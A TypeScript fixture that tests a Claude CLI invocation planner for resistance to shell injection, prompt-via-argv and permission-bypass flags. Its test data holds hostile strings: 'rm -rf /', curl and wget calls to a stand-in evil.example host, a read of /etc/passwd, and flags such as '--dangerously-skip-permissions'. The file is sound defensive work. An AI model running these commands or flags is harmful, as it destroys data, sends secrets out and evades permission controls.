/**
 * Fixture proof for T-X010 — malicious prompt interpolation:
 * no shell injection. Prompt is delivered via stdin; argv is fixed;
 * shell is always false. Live wiring NOT_WIRED; externalEffects NONE.
 * Hillclimb: honesty stamps; refuse prompt-via-argv; NUL; unsafe modelId.
 * Wave-13 Codex harden: shell-metachar extraArgs; append-system-prompt;
 * -p=…; blank modelId. Wave-15: bare `--`; overlong modelId;
 * --system-prompt-file=; A00/A31 INVALID_AGENT. Wave-17: NUL extraArgs;
 * --permission-mode=; MultiEdit; lowercase agent. ACCEPTED ≠ VERIFIED.
 */

import { randomUUID } from "node:crypto";
import { SoakProofKind, type SoakProofRecord } from "@worksocial/domain";
import { planClaudeCliInvocation } from "@worksocial/claude-runner";

/**
 * Complete expected proof set for T-X010 fixture ACCEPTED.
 */
export function proofMaliciousPromptNoShellInjection(
  nowIso: string,
): SoakProofRecord {
  const details: string[] = [];
  let passed = true;

  const maliciousPrompts = [
    'owner title"; rm -rf / #',
    "$(curl http://evil.example/exfil)",
    "`id; cat /etc/passwd`",
    "website text | sh",
    "incoming && wget http://evil.example/p",
    "';$(curl evil)`\n; reboot",
  ];

  for (const prompt of maliciousPrompts) {
    const plan = planClaudeCliInvocation({
      agentName: "A13",
      modelId: "claude-fixture-model",
      prompt,
    });
    if (!plan.ok) {
      passed = false;
      details.push(`Malicious prompt unexpectedly denied: ${plan.reason}`);
      continue;
    }
    if (plan.shell !== false) {
      passed = false;
      details.push("Plan shell must be false");
    }
    if (plan.promptDelivery !== "stdin") {
      passed = false;
      details.push("Prompt delivery must be stdin");
    }
    if (plan.prompt !== prompt) {
      passed = false;
      details.push("Prompt body must be preserved for stdin write");
    }
    if (plan.argvContainsPrompt !== false) {
      passed = false;
      details.push("argvContainsPrompt must be false");
    }
    if (
      plan.liveProviderWiring !== "NOT_WIRED" ||
      plan.externalEffects !== "NONE" ||
      plan.fixtureOnly !== true
    ) {
      passed = false;
      details.push("Honesty stamps missing on ok plan");
    }
    const argvJoined = plan.argv.join("\0");
    if (argvJoined.includes(prompt)) {
      passed = false;
      details.push("Prompt leaked into argv (shell interpolation risk)");
    }
    const metacharTokens = [";", "$(", "`", "|", "&&", "\n"];
    for (const token of metacharTokens) {
      if (
        prompt.includes(token) &&
        plan.argv.some((arg) => arg.includes(token))
      ) {
        passed = false;
        details.push(`Shell metachar ${JSON.stringify(token)} appeared in argv`);
      }
    }
  }
  if (passed) {
    details.push(
      "Malicious prompts planned with shell=false; prompt via stdin; argv clean; honesty stamps",
    );
  }

  const bashDenied = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    tools: "Bash,Read",
  });
  if (!bashDenied.ok && bashDenied.code === "FLAG_DENIED") {
    details.push("Bash tool string refused (FLAG_DENIED)");
  } else {
    passed = false;
    details.push(`Bash tools unexpectedly ${JSON.stringify(bashDenied)}`);
  }

  const metaDenied = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: [";rm", "-rf", "/"],
  });
  if (!metaDenied.ok && metaDenied.code === "FLAG_DENIED") {
    details.push("Shell-metachar extraArgs refused (FLAG_DENIED)");
  } else {
    passed = false;
    details.push(`Shell-metachar extraArgs unexpectedly ${JSON.stringify(metaDenied)}`);
  }

  const bypassDenied = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["--dangerously-skip-permissions"],
  });
  if (!bypassDenied.ok && bypassDenied.code === "FLAG_DENIED") {
    details.push("Permission-bypass flag refused");
  } else {
    passed = false;
    details.push(`Bypass flag unexpectedly ${JSON.stringify(bypassDenied)}`);
  }

  const promptViaArgv = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["--prompt", "evil via argv"],
  });
  if (!promptViaArgv.ok && promptViaArgv.code === "FLAG_DENIED") {
    details.push("Prompt-via-argv flag refused (stdin only)");
  } else {
    passed = false;
    details.push(
      `Prompt-via-argv unexpectedly ${JSON.stringify(promptViaArgv)}`,
    );
  }

  const nulPrompt = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "hello\0world",
  });
  if (!nulPrompt.ok && nulPrompt.code === "PROMPT_NUL_REFUSED") {
    details.push("NUL-in-prompt refused (PROMPT_NUL_REFUSED)");
  } else {
    passed = false;
    details.push(`NUL prompt unexpectedly ${JSON.stringify(nulPrompt)}`);
  }

  const badModel = planClaudeCliInvocation({
    agentName: "A01",
    modelId: 'claude; rm -rf /',
    prompt: "benign",
  });
  if (!badModel.ok && badModel.code === "INVALID_MODEL") {
    details.push("Unsafe modelId refused (INVALID_MODEL)");
  } else {
    passed = false;
    details.push(`Unsafe modelId unexpectedly ${JSON.stringify(badModel)}`);
  }

  const modelOverride = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["--model=claude;reboot"],
  });
  if (!modelOverride.ok && modelOverride.code === "FLAG_DENIED") {
    details.push("extraArgs --model override refused (FLAG_DENIED)");
  } else {
    passed = false;
    details.push(
      `Model override unexpectedly ${JSON.stringify(modelOverride)}`,
    );
  }

  let coincidentalOk = true;
  for (const prompt of ["json", "4", "A13", ""]) {
    const plan = planClaudeCliInvocation({
      agentName: "A13",
      modelId: "claude-fixture-model",
      prompt,
    });
    if (
      !plan.ok ||
      plan.promptDelivery !== "stdin" ||
      plan.argvContainsPrompt !== false
    ) {
      coincidentalOk = false;
      details.push(
        `Coincidental prompt ${JSON.stringify(prompt)} unexpectedly ${JSON.stringify(plan)}`,
      );
    }
  }
  if (coincidentalOk) {
    details.push(
      "Coincidental argv-token prompts (json/4/A13/empty) accepted via stdin",
    );
  } else {
    passed = false;
  }

  const pathAgent = planClaudeCliInvocation({
    agentName: "/tmp/.claude/agents/A01.md",
    modelId: "claude-fixture-model",
    prompt: "benign",
  });
  if (!pathAgent.ok && pathAgent.code === "INVALID_AGENT") {
    details.push("Path-like agent name refused (INVALID_AGENT)");
  } else {
    passed = false;
    details.push(`Path agent unexpectedly ${JSON.stringify(pathAgent)}`);
  }

  // Wave-13 Codex harden: non-flag shell-metachar extraArgs.
  const metaExtra = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["; rm -rf /"],
  });
  if (!metaExtra.ok && metaExtra.code === "FLAG_DENIED") {
    details.push("extraArgs shell-metachar token refused (FLAG_DENIED)");
  } else {
    passed = false;
    details.push(`Shell-metachar extraArgs unexpectedly ${JSON.stringify(metaExtra)}`);
  }

  const appendSystem = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["--append-system-prompt", "evil"],
  });
  if (!appendSystem.ok && appendSystem.code === "FLAG_DENIED") {
    details.push("--append-system-prompt refused (prompt-via-argv)");
  } else {
    passed = false;
    details.push(
      `append-system-prompt unexpectedly ${JSON.stringify(appendSystem)}`,
    );
  }

  const attachedPrompt = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["-p=evil"],
  });
  if (!attachedPrompt.ok && attachedPrompt.code === "FLAG_DENIED") {
    details.push("Attached -p=… prompt-via-argv refused");
  } else {
    passed = false;
    details.push(
      `Attached -p= unexpectedly ${JSON.stringify(attachedPrompt)}`,
    );
  }

  const blankModel = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "   ",
    prompt: "benign",
  });
  if (!blankModel.ok && blankModel.code === "INVALID_MODEL") {
    details.push("Blank modelId refused (INVALID_MODEL)");
  } else {
    passed = false;
    details.push(`Blank modelId unexpectedly ${JSON.stringify(blankModel)}`);
  }

  // Wave-15 deepen: bare -- / overlong model / system-prompt-file= / A00|A31.
  const endOpts = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["--"],
  });
  if (!endOpts.ok && endOpts.code === "FLAG_DENIED") {
    details.push("Bare -- end-of-options refused in extraArgs");
  } else {
    passed = false;
    details.push(`Bare -- unexpectedly ${JSON.stringify(endOpts)}`);
  }

  const overlongModel = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "a".repeat(129),
    prompt: "benign",
  });
  if (!overlongModel.ok && overlongModel.code === "INVALID_MODEL") {
    details.push("Overlong modelId refused (INVALID_MODEL)");
  } else {
    passed = false;
    details.push(
      `Overlong modelId unexpectedly ${JSON.stringify(overlongModel)}`,
    );
  }

  const sysPromptFile = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["--system-prompt-file=/tmp/evil"],
  });
  if (!sysPromptFile.ok && sysPromptFile.code === "FLAG_DENIED") {
    details.push("Attached --system-prompt-file= refused (prompt-via-argv)");
  } else {
    passed = false;
    details.push(
      `system-prompt-file= unexpectedly ${JSON.stringify(sysPromptFile)}`,
    );
  }

  const a31 = planClaudeCliInvocation({
    agentName: "A31",
    modelId: "claude-fixture-model",
    prompt: "benign",
  });
  const a00 = planClaudeCliInvocation({
    agentName: "A00",
    modelId: "claude-fixture-model",
    prompt: "benign",
  });
  if (
    !a31.ok &&
    a31.code === "INVALID_AGENT" &&
    !a00.ok &&
    a00.code === "INVALID_AGENT"
  ) {
    details.push("Out-of-range agent A00/A31 refused (INVALID_AGENT)");
  } else {
    passed = false;
    details.push(
      `Out-of-range agent unexpectedly a31=${JSON.stringify(a31)} a00=${JSON.stringify(a00)}`,
    );
  }

  // Wave-17 deepen: NUL extraArgs / permission-mode / MultiEdit / lowercase agent.
  const nulExtra = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["safe\0evil"],
  });
  if (!nulExtra.ok && nulExtra.code === "FLAG_DENIED") {
    details.push("NUL in extraArgs refused (FLAG_DENIED)");
  } else {
    passed = false;
    details.push(`NUL extraArgs unexpectedly ${JSON.stringify(nulExtra)}`);
  }

  const permMode = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    extraArgs: ["--permission-mode=dontAsk"],
  });
  if (!permMode.ok && permMode.code === "FLAG_DENIED") {
    details.push("--permission-mode=dontAsk refused in extraArgs");
  } else {
    passed = false;
    details.push(`permission-mode unexpectedly ${JSON.stringify(permMode)}`);
  }

  const multiEdit = planClaudeCliInvocation({
    agentName: "A01",
    modelId: "claude-fixture-model",
    prompt: "benign",
    tools: "MultiEdit",
  });
  if (!multiEdit.ok && multiEdit.code === "FLAG_DENIED") {
    details.push("MultiEdit tool string refused (FLAG_DENIED)");
  } else {
    passed = false;
    details.push(`MultiEdit unexpectedly ${JSON.stringify(multiEdit)}`);
  }

  const lowerAgent = planClaudeCliInvocation({
    agentName: "a13",
    modelId: "claude-fixture-model",
    prompt: "benign",
  });
  if (!lowerAgent.ok && lowerAgent.code === "INVALID_AGENT") {
    details.push("Lowercase agent a13 refused (INVALID_AGENT)");
  } else {
    passed = false;
    details.push(`Lowercase agent unexpectedly ${JSON.stringify(lowerAgent)}`);
  }

  const benign = planClaudeCliInvocation({
    agentName: "A25",
    modelId: "claude-fixture-model",
    prompt: "Summarize approved facts only",
  });
  if (
    benign.ok &&
    benign.shell === false &&
    benign.promptDelivery === "stdin" &&
    benign.argvContainsPrompt === false &&
    benign.liveProviderWiring === "NOT_WIRED" &&
    benign.externalEffects === "NONE" &&
    !benign.argv.join("\0").includes(benign.prompt)
  ) {
    details.push("Benign prompt also stdin-only (positive control)");
  } else {
    passed = false;
    details.push(`Benign plan unexpectedly ${JSON.stringify(benign)}`);
  }

  details.push(
    "liveProviderSuccessClaimed=false liveProviderWiring=NOT_WIRED externalEffects=NONE",
  );

  return {
    proofId: `proof-prompt-interp-${randomUUID()}`,
    kind: SoakProofKind.MALICIOUS_PROMPT_NO_SHELL_INJECTION,
    passed,
    details,
    applyAttemptCount: 1,
    operationId: `op-x010-${randomUUID().slice(0, 8)}`,
    createdAtIso: nowIso,
    fixtureOnly: true,
  };
}
